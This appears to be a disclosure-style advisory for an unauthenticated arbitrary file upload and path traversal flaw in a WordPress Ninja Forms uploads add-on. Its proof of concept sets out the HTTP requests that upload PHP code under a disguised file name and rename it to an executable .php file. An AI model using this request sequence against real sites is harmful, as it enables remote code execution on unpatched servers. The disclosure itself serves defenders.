__TITLE__:-
(_Wordpress_) Ninja Forms File Uploads Extension <= 3.0.22 â€“ Unauthenticated Arbitrary File Upload

__TECHNOLOGY__:-
WordPress

__Plugin__:-
https://ninjaforms.com/extensions/file-uploads/

__SEVERITY__:-
unrated

__DESCRIPTION__:-
Path Traversal and Unrestricted File Upload exists in the Ninja Forms plugin before 3.0.23 for WordPress (when the Uploads add-on is activated). This allows an attacker to traverse the file system to access files and execute code via the includes/fields/upload.php (aka upload/submit page) name and tmp_name parameters.

__PROOF OF CONCEPT__:-
Initial file upload Request:
```
Host: testserver.com
Content-Type: multipart/form-data; boundary=---------------------------16345274557837
Content-Length: 522

-----------------------------16345274557837
Content-Disposition: form-data; name="form_id"

1
-----------------------------16345274557837
Content-Disposition: form-data; name="field_id"

5
-----------------------------16345274557837
Content-Disposition: form-data; name="nonce"

0f3a997174
-----------------------------16345274557837
Content-Disposition: form-data; name="files"; filename="test.png.doc"
Content-Type: application/msword

<?php phpinfo(); ?>
-----------------------------16345274557837--
```

Response:
```
HTTP/1.1 200 OK
Server: nginx/1.14.0 

"data":{  
    "files":[  
       {  
          "name":"test.png.doc",
          "type":"application\/msword",
          "tmp_name":"nftmp-14FpD-test.png.doc",
          "error":0,
          "size":19
       }
    ]
 }
 ```
When the form is submitted the initially uploaded _tmp_ file is moved to a new location:
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: testserver.com
Content-Length: 6850

--snip-- 
"5":{  
 "value":1,
 "id":5,
 "files":[  
    {  
       "name":"test.(php)",
       "tmp_name":"nftmp-BNxfG-test.png.doc",
       "fieldID":5
    }
 ]
--snip--
```
The parameter name is then sanitized by the WordPress function sanitize_file_name, which essentially only removes a set of predefined special characters:
```
ninja-forms-uploads/includes/fields/upload.php:124
$file_name = sanitize_file_name(basename($target_file)); 
```
sanitize_file_name 
Removes special characters that are illegal in filenames  
on certain operating systems and special characters 
requiring special escaping to manipulate at the command line. 
Replaces spaces and consecutive dashes with a single dash.  
Trims period, dash and underscore from beginning and end of filename.  
It is not guaranteed that this function will return a filename 
that is allowed to be uploaded.

This results in moving the tmp file to its final location:`/wp-content/uploads/ninja-forms/1/test.php`
